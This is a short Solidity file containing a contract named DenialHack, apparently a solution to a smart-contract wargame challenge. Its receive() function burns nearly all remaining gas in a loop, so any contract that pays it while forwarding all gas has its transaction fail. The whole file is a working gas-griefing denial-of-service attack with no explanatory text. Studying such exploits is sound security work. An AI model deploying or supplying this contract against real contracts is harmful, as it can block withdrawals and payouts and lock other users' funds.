// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialHack {
    receive() external payable {
        uint256 i;
        while (gasleft() > 10) {
            i++;
        }
    }
}